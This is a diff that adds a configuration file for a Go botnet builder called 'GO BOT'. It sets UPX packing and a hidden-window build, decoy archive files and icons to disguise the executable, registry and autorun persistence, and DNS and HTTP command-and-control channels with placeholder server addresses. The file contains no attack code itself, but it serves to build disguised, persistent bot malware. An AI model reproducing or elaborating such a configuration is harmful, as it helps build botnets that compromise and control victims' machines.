@@ -1,0 +1,50 @@
+#GO BOT Config
+
+[buildconf]
+gobotnetPath 		=	"D:/WorkSpace/GoProjects/github.com/gobotnet/"
+buildFlags 			=	"-ldflags \"-w -s -H=windowsgui\""
+readyFolder 		=	"ready/"   
+upxPath 			=	"C:/upx391w/upx.exe"
+ffFolderPath 		=	""
+icoFolderPath 		=	""
+ffarray 			= [
+						"fakefiles/test.rar"
+				    ]
+icoarray 			= [
+						"icons/test.ico"
+				  	]
+
+rsrcPath 			=	"D:/WorkSpace/GoProjects/github.com/gobotnet/client/utils/rsrc.exe"
+sysoName 			=	"main.syso"
+defaultExeName 		=	"as32.exe"
+copyNameFromFF 		=	true
+usingErrorMessage 	=	false
+
+[variables]
+usingDNS 			=	true
+usingHTTP			= 	true
+rewriteExe 			=	true
+launchFakeFile 		= 	true  
+usingRegistry  		= 	true
+usingAutorun   		= 	true                          
+debugMode      		= 	false                         
+attemptCount   		= 1
+dnsAddress     		= "domain.ru"
+winHttpTimeout 		= [
+						0, 
+						60000, 
+						30000, 
+						30000
+					]
+firstInterface 		=	"HTTP"
+usingGroupId 		= 	true 
+countGroups 		= 	5
+
+[servers]
+urls 				= [
+						"8.8.8.8"
+					]
+
+ports 				= [
+						80
+					]
